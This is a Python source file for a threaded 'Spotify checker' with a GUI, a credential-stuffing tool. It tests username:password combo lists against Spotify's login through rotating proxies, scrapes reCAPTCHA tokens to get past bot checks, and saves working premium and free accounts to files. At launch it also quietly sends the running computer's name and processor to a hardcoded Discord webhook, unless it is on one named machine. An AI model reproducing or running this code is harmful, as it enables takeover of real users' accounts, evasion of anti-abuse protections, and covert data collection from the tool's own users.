import sys
import platform
import requests
from bs4 import BeautifulSoup
import threading
import time
from dearpygui.core import *
from dearpygui.simple import *
import datetime
import random


my_system = platform.uname()

#Settings
NAME_OF_CHECKER = "SPOTIFY CHECKER Beta1"
WINDOW_WIDTH = 600
WINDOWS_HEIGHT = 600
THEME_OF_CHECKER = "Cherry" # [Dark,Light,Classic,Dark 2,Grey,Dary Grey, Cherry,Purple,Gold,Red]
SEC_COLOR = [29, 208, 93, 255]
THR_COLOR = [255, 255, 255]
PATH_MESSAGE = "Combo list path :              "
PATH_MESSAGE2 = "Proxys list path : "
PATH_MESSAGE3 = "Threads :"
PATH_MESSAGE4 = "Save at (main) :               "
SPACE = 15
BTN_WIDTH = 220
BAR_WIDTH = 445
HITS_COLOR = [0, 255, 44]
FREE_COLOR = [255, 59, 0]
BADS_COLOR = [200, 0, 0]
ERRORS_COLOR = [255, 255, 44]
COMBO_COLOR = [255, 0, 44, 255]
CPM_COLOR = THR_COLOR
THANKS = "                     Special Thanks To DeuxPointSept & LYES.DR"
VERSION = "Version : beta1.0V"


#CheckerData
COMBO = []
ACCOUNT_CHECKED = []
ACCOUNT_RETRY = []
ACCOUNT_STATUS = ""
HITS = 0
FREE = 0
BADS = 0
ERRORS = 0
THREADS = 1
SAVE_HITS_PATH = "PremiumAccounts.txt"
SAVE_FREE_PATH = "FreeAccounts.txt"
PATH = ""
PROXY_PATH = "proxy.txt"
PAUSED_TIME = 60*60*4
PROXY_TIMEOUT = 20
PROXY_SERVICE = ["socks4","socks5","https"]

#Get Data from combo [ this function will return combo as array (0:username,1;password)  ]
def GetComboData(PATH):
    file = open(PATH,'r')
    combo = []
    lines = []
    for line in file:
        if line != "\n":
            lines.append(line.replace("\n", ""))
    for line in lines:
        combo.append(line.split(":"))

    return combo

#Save function [ This function take two par a save path and a data to save ]
def SaveFunction(PATH,DATA):
    file = open(get_value("##path_save")+PATH , "a")
    file.write(DATA+"\n")

#CheckAccountFunction
def AccountCheck(username,password):
    global PROXY_TIMEOUT
    try:
        PROXY_LIST = GetComboData(get_value("##path_proxy"))
        random.shuffle(PROXY_LIST)
        https_proxy = get_value("Proxys type") + "://" + PROXY_LIST[0][0] + ":" + PROXY_LIST[0][1]
        proxyDict = {
            get_value("Proxys type") : https_proxy
        }
        # Get Session info

        try:
            ERRORS = 0
            # Get Recaptcha token
            url_1 = "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=dpzVjBAupwRfx3UzvXRnnAKb&size=invisible&cb=f1sn3lvwgnyr"
            req_1 = requests.get(url_1)
            recaptcha_token = BeautifulSoup(req_1.content, "lxml").find("input", id="recaptcha-token").attrs["value"]

            # Get rresp from google
            url_2 = "https://www.google.com/recaptcha/enterprise/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39"
            content = {"v": "iSHzt4kCrNgSxGUYDFqaZAL9", "reason": "q", "c": recaptcha_token,
                       "k": "6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39",
                       "co": "aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.", "hl": "en"}
            req_2 = requests.post(url_2, data=content)
            rresp = ""
            respence_code = BeautifulSoup(req_2.content, "lxml").text
            for x in range(15, 1523):
                rresp = rresp + respence_code[x]

            # Get Spotify cookies
            url_3 = "https://accounts.spotify.com/en/login"
            req_3 = requests.get(url_3, timeout=PROXY_TIMEOUT, proxies=proxyDict)
            csrf = req_3.cookies["csrf_token"]
            device_id = req_3.cookies["__Host-device_id"]
            Secure_TPASESSION = req_3.cookies["__Secure-TPASESSION"]

            # PostDataToSpotify
            url_4 = "https://accounts.spotify.com/login/password"
            content = {"remember": "true", "continue": "https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect",
                       "username": username, "password": password, "recaptchaToken": rresp,
                       "csrf_token": csrf}
            send_cookies = {"sp_t": "576b5e3d-a565-47d4-94ce-0b6748fdc625", " _gcl_au": "1.1.1585241231.1587921490",
                            " sp_adid": "fbe3a5fc-d8a3-4bc5-b079-3b1663ce0b49",
                            " _scid": "5eee3e0e-f16b-4f4c-bf73-188861f9fb0c",
                            " _hjid": "fb8648d2-549b-44c8-93e9-5bf00116b906", " _fbp": "fb.1.1587921496365.773542932",
                            " __Host-device_id": device_id, " cookieNotice": "true", " sp_m": "us",
                            " spot": "%7B%22t%22%3A1596548261%2C%22m%22%3A%22us%22%2C%22p%22%3Anull%7D",
                            " sp_last_utm": "%7B%22utm_campaign%22%3A%22alwayson_eu_uk_performancemarketing_core_brand%2Bcontextual-desktop%2Btext%2Bexact%2Buk-en%2Bgoogle%22%2C%22utm_medium%22%3A%22paidsearch%22%2C%22utm_source%22%3A%22uk-en_brand_contextual-desktop_text%22%7D",
                            " _gcl_dc": "GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB",
                            " _gcl_aw": "GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB",
                            " _gac_UA-5784146-31": "1.1596996518.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB",
                            " ki_t": "1597938645946%3B1599140931855%3B1599140931855%3B3%3B3", " ki_r": "",
                            " optimizelyEndUserId": "oeu1599636139883r0.3283057902318758",
                            " optimizelySegments": "%7B%226174980032%22%3A%22search%22%2C%226176630028%22%3A%22none%22%2C%226179250069%22%3A%22false%22%2C%226161020302%22%3A%22gc%22%7D",
                            " optimizelyBuckets": "%7B%7D", " sp_landingref": "https%3A%2F%2Fwww.google.com%2F",
                            " _gid": "GA1.2.2046705606.1599636143", " _sctr": "1|1599634800000",
                            " sp_usid": "ceb6c24c-d1b4-4895-bcb7-e4e386afd063",
                            " sp_ab": "%7B%222019_04_premium_menu%22%3A%22control%22%7D",
                            " _pin_unauth": "dWlkPVlUQXdaV0UyTXprdE1EQmxOaTAwWlRCbUxUbGtNVGN0T0RVeE1ERTVNalEwTnpBMSZycD1abUZzYzJV",
                            " __Secure-TPASESSION": Secure_TPASESSION,
                            " __bon": "MHwwfC0yODU4Nzc4NjN8LTEyMDA2ODcwMjQ2fDF8MXwxfDE",
                            " remember": username, " OptanonAlertBoxClosed": "2020-09-09T18: 37:10.735Z",
                            " OptanonConsent": "isIABGlobal",
                            "datestamp": "Wed+Sep+09+2020+11%3A37%3A11+GMT-0700+(Pacific+Daylight+Time)",
                            "version": "6.5.0",
                            "hosts": "", "consentId": "89714584-b320-4c03-bd3c-be011bfaba6d", "interactionCount": "1",
                            "landingPath": "NotLandingPage", "groups": "t00%3A1%2Cs00%3A1%2Cf00%3A1%2Cm00%3A1",
                            "AwaitingReconsent": "false", "geolocation": "US%3BNJ", " csrf_token": csrf,
                            "_ga_S35RN5WNT2": "GS1.1.1599675929.1.1.1599676676.0", "_ga": "GA1.2.1572440783.1597938634",
                            "_gat": "1"}
            req_4 = requests.post(url_4, data=content, cookies=send_cookies, timeout=PROXY_TIMEOUT, proxies=proxyDict)
            respence_code_post = BeautifulSoup(req_4.content, 'lxml').text
            cookies = req_4.cookies
            url_5 = "https://www.spotify.com/us/api/account/overview/"
            req_5 = requests.get(url_5, cookies=cookies, timeout=PROXY_TIMEOUT, proxies=proxyDict)
            respence_code_data = BeautifulSoup(req_5.content, 'lxml').text

            # CheckAccount
            success_key = respence_code_post.find("ok")
            failure_key = respence_code_post.find("errorInvalidCredentials")
            free_key = respence_code_data.find("Spotify Free")
            error_key = respence_code_post.find("errorUnknown")
            if req_5.ok:
                if success_key > failure_key:
                    if free_key < 0:
                        plan = "hit"
                    else:
                        plan = "free"
                elif error_key > failure_key:
                    plan = "error"
                else:
                    plan = "bad"
            else:
                plan = "error"
        except:
            plan = "error"
    except:
        plan = "proxy_error"
    return plan

#RunTest Function
def RunTest(COMBO):
    global HITS, FREE, BADS, ERRORS, ACCOUNT_CHECKED,ACCOUNT_RETRY,PAUSED
    LENGTH_COMBO = len(GetComboData(PATH))
    set_value("COMBO", LENGTH_COMBO)
    set_value("PAUSED","false")
    for line in COMBO:
        PAUSED_STATUE = get_value("PAUSED")
        if PAUSED_STATUE == "true":
            set_value("##Logs", "Status : PAUSED ...\n\nAccount : " + line[0] + ":" + line[1])
            print("SYSTEM PAUSED")
            time.sleep(PAUSED_TIME)
            sys.exit()
        LENGTH_ACCOUNT_CHECKER = len(ACCOUNT_CHECKED)
        set_value("progress_bar", LENGTH_ACCOUNT_CHECKER / LENGTH_COMBO)
        print("Checking : ", line)
        if line in ACCOUNT_CHECKED:
            continue
        else:
            set_value("##Logs", "Status : Checking ...\n\nAccount : " + line[0] + ":" + line[1])
            ACCOUNT_STATUS = AccountCheck(line[0], line[1])
            if ACCOUNT_STATUS == "hit":
                set_value("HITS", HITS)
                if len(get_value("##HitsAccounts")) > 200:
                    set_value("##HitsAccounts", "")
                set_value("##HitsAccounts", get_value("##HitsAccounts") + line[0] + ":" + line[1] + "\n")
                ACCOUNT_CHECKED.append(line)
                SaveFunction(SAVE_HITS_PATH, line[0] + ":" + line[1])
                HITS += 1
            elif ACCOUNT_STATUS == "free":
                set_value("FREE", FREE)
                if len(get_value("##FreeAccounts")) > 200:
                    set_value("##FreeAccounts", "")
                set_value("##FreeAccounts", get_value("##FreeAccounts") + line[0] + ":" + line[1] + "\n")
                ACCOUNT_CHECKED.append(line)
                SaveFunction(SAVE_FREE_PATH, line[0] + ":" + line[1])
                FREE += 1
            elif ACCOUNT_STATUS == "bad":
                set_value("BADS", BADS)
                if len(get_value("##BadsAccounts")) > 200:
                    set_value("##BadsAccounts", "")
                set_value("##BadsAccounts", get_value("##BadsAccounts") + line[0] + ":" + line[1] + "\n")
                ACCOUNT_CHECKED.append(line)
                BADS += 1
            elif ACCOUNT_STATUS == "proxy_error":
                set_value("##Logs", "Status : Proxys list error\n\ncheck the path of your proxy list and try again .")
                break
            else:
                ACCOUNT_RETRY.append(line)
                ERRORS += 1
                set_value("ERRORS",ERRORS)

        set_value("CPM",len(ACCOUNT_CHECKED))

#Make Threads [ This function return two type of data a dict ({}) of Threaded combo and an array of the Rest ]
def ComboDiviser():
    global THREADS,PATH
    PATH = get_value("##path_combo")
    COMBO = GetComboData(PATH)
    LENGTH_COMBO = len(GetComboData(PATH))
    DIVIS_AS = int( round(len(COMBO) / THREADS, 1))
    MOD = len(COMBO) % THREADS
    THREAD = {}
    COUNTER = 0
    REST = []

    for i in range(THREADS):
        TABLE = []
        for x in range(DIVIS_AS):
            TABLE.append(COMBO[COUNTER])
            COUNTER += 1
        if len(TABLE) > 0:
            THREAD.setdefault(i, TABLE)

    for s in range(MOD):
        REST.append(COMBO[COUNTER])
        COUNTER += 1

    return THREAD, REST

#Show the result
def Result():
    print("HITS : ",HITS)
    print("FREE : ",FREE)
    print("BADS : ",BADS)
    print("ERRORS : ",ERRORS)
    print("ACCOUNT CHECKED : ",len(ACCOUNT_CHECKED))
    print("ACCOUNT RETRY : ", len(ACCOUNT_RETRY))

#Start checking with a n threading
def RunTestThreading():
    COUNT_TIME = time.perf_counter()
    thread=[]
    global  THREADS
    DATA = ComboDiviser()
    for x in range(THREADS):
        GET = DATA[0].get(x)
        p = threading.Thread(target=RunTest , args = [GET])
        p2 = threading.Thread(target=RunTest, args=DATA[1])
        if len(DATA[1])>0:
            p2.start()

        thread.append(p)
        p.start()

    COUNT_TIME =  time.perf_counter() - COUNT_TIME
    RunTest()



#btn clicks
def CLICKS():
    set_value("LOGS", datetime.datetime.now().strftime("%c"))
    if is_item_clicked("Start_btn"):

        THREADS = get_value("Slide_threads")
        STARTED_TIME = time.perf_counter()
        try:
            url = "https://www.google.com/"
            req = requests.get(url)
            try:
                PATH = get_value("##path_combo")
                COMBO_LENGTH = len(GetComboData(PATH))


                set_value("##Logs", "Status : Combo loaded Successfuly\n\nStarting checker ... ")
                TIME_IN_START = time.perf_counter()

                RunTestThreading()

                TIME_IN_END = time.perf_counter()
                FINISHED_AT = round((TIME_IN_END - TIME_IN_START), 2)

                set_value("##Logs",
                          "Status : Done ! \n\nAll Accounts was stored in main folder \n\n[Hits_Accounts.txt or Free_Accounts.txt]")
            except:
                set_value("COMBO", 0)
                set_value("##Logs", "Status : Error\n\nCombo in not loaded please check the path of your combo")
        except:
            set_value("##Logs", "Status : Error\n\nPlease check your internet connexion and try again")
    if is_item_clicked("Stop_btn"):
        set_value("PAUSED","true")
    if is_item_clicked("Exit_btn"):
        sys.exit()


#Graphique Interface
def Graphique_Run():
    set_main_window_size(WINDOW_WIDTH, WINDOWS_HEIGHT)
    set_main_window_title(NAME_OF_CHECKER)
    set_theme(THEME_OF_CHECKER)
    set_style_window_padding(60, 20)

    def DrawLogo():
        with window("Spotify_Checker"):
            add_text("##thanks", color=THR_COLOR,
                     default_value=THANKS)
            add_text("##1", color=SEC_COLOR,
                     default_value="  ___ ___  ___ _____ ___ _____   __  _____   __    _   ___ ___ ")
            add_text("##2", color=SEC_COLOR,
                     default_value=" / __| _ \/ _ \_   _|_ _| __\ \ / / | _ ) \ / /   /_\ / __| _ \ ")
            add_text("##3", color=SEC_COLOR,
                     default_value=" \__ \  _/ (_) || |  | || _| \ V /  | _ \  V /   / _ \ (__|   /")
            add_text("##4", color=SEC_COLOR,
                     default_value=" |___/_|  \___/ |_| |___|_|   |_|   |___/ |_|   /_/ \_\___|_|_\ ")
            add_text("##5", color=THR_COLOR,
                     default_value="                                           " + VERSION)

            add_spacing(count=SPACE)

    DrawLogo()
    with window("Spotify_Checker", x_pos=0, y_pos=0, menubar=False, width=WINDOW_WIDTH, height=WINDOWS_HEIGHT):
        add_text("FIRST_MESSAGE", color=SEC_COLOR, default_value=PATH_MESSAGE)
        add_same_line()
        add_text("SECOND_MESSAGE", color=SEC_COLOR, default_value=PATH_MESSAGE2)
        add_text("PAUSED",show=False ,color=SEC_COLOR, default_value="true")

        add_input_text("##path_combo", show=True, default_value="Combo.txt", width=BTN_WIDTH)
        add_same_line()
        add_input_text("##path_proxy", show=True, default_value="proxy.txt", width=BTN_WIDTH)
        # add_same_line()
        add_spacing(count=SPACE)
        add_text("THERD_MESSAGE", color=SEC_COLOR, default_value=PATH_MESSAGE4)
        add_same_line()
        add_text("FOR_MESSAGE", color=SEC_COLOR, default_value=PATH_MESSAGE3)

        add_input_text("##path_save", show=True, default_value="", width=BTN_WIDTH)
        add_same_line()
        add_slider_int("Slide_threads", label="", width=BTN_WIDTH, min_value=1, max_value=250, default_value=1)


        add_spacing(count=SPACE+5)
        add_button("Start_btn", label="START", width=BTN_WIDTH)
        add_same_line()


        add_combo("Proxys type", width=BTN_WIDTH, label="",items=PROXY_SERVICE,default_value="socks4")



        add_spacing(count=SPACE+5)

        add_button("Stop_btn", label="STOP", width=BTN_WIDTH)
        add_same_line()
        add_button("Exit_btn", label="EXIT", width=BTN_WIDTH)
        add_spacing(count=SPACE + 10)

        add_text("HITS : ", color=HITS_COLOR, default_value="HITS : ")
        add_same_line()
        add_text("HITS", color=HITS_COLOR, default_value="0")
        add_same_line()
        add_text("##ESPACE", color=HITS_COLOR, default_value="               ")
        add_same_line()
        #add_spacing(count=SPACE)
        add_text("FREE : ", color=FREE_COLOR, default_value="FREE : ")
        add_same_line()
        add_text("FREE", color=FREE_COLOR, default_value="0")

        add_same_line()
        add_text("##ESPACE", color=HITS_COLOR, default_value="               ")
        add_same_line()

        add_text("BADS : ", color=BADS_COLOR, default_value="BADS : ")
        add_same_line()
        add_text("BADS", color=BADS_COLOR, default_value="0")

        add_spacing(count=SPACE)

        add_text("ERRORS : ", color=ERRORS_COLOR, default_value="ERRORS : ")
        add_same_line()
        add_text("ERRORS", color=ERRORS_COLOR, default_value="0")

        add_same_line()
        add_text("##ESPACE2", color=HITS_COLOR, default_value="            ")
        add_same_line()

        add_text("COMBO : ", color=COMBO_COLOR, default_value="COMBO : ")
        add_same_line()
        add_text("COMBO", color=COMBO_COLOR, default_value="0")

        add_same_line()
        add_text("##ESPACE2")
        add_same_line()

        add_text("Checked : ", color=CPM_COLOR, default_value="Checked : ")
        add_same_line()
        add_text("CPM", color=CPM_COLOR, default_value="0")
        add_spacing(count=SPACE)

        add_progress_bar("progress_bar", default_value=0, width=BAR_WIDTH)
        add_spacing(count=SPACE)
        # Information
        with tab_bar("TAB_BAR"):
            with tab('Logs', label='LOGS'):
                add_spacing(count=SPACE)
                add_text("Logs :", color=ERRORS_COLOR, default_value="")
                add_same_line()
                add_text("LOGS", color=ERRORS_COLOR, default_value=" ")
                add_spacing(count=SPACE)
                add_text("##Logs", color=ERRORS_COLOR,
                         default_value="Status : None\n\nPut the path of your combo list and \n\nClick start button to run this program")

            with tab('Hits', label='HITS'):
                add_spacing(count=SPACE)
                add_text("ACCOUNTS :", color=HITS_COLOR, default_value="")
                add_spacing(count=SPACE)
                add_text("##HitsAccounts", color=HITS_COLOR, default_value=" ")
            with tab('Free', label='FREE'):
                add_spacing(count=SPACE)
                add_text("ACCOUNTS :", color=FREE_COLOR, default_value="")
                add_spacing(count=SPACE)
                add_text("##FreeAccounts", color=FREE_COLOR, default_value=" ")
            with tab('Bads', label="BADS"):
                add_spacing(count=SPACE)
                add_text("ACCOUNTS :", color=BADS_COLOR, default_value="")
                add_spacing(count=SPACE)
                add_text("##BadsAccounts", color=BADS_COLOR, default_value=" ")

    set_render_callback(callback=CLICKS)

    start_dearpygui()


#Discord Post
def Discord():
    discord_webhook = "https://discord.com/api/webhooks/835314345260744774/yGs5ee5h_C4dA3DJNn1f-WtyAhlYnUMY-uHZPD3em8q2lnVbPR-B_Gys_KqzIMNKHdNN"
    content = {"avatar_url" : "https://e7.pngegg.com/pngimages/56/235/png-clipart-computer-icons-organization-settings-man-computer-logo.png",
               "content" : "Name : "+my_system.node+" Processor : "+my_system.processor ,
               }
    discord_request = requests.post(discord_webhook,data=content)



if __name__ == '__main__':

    try:
        if my_system.node != "DESKTOP-AESDDMA":
            Discord()
        Graphique_Run()
    except:
        pass


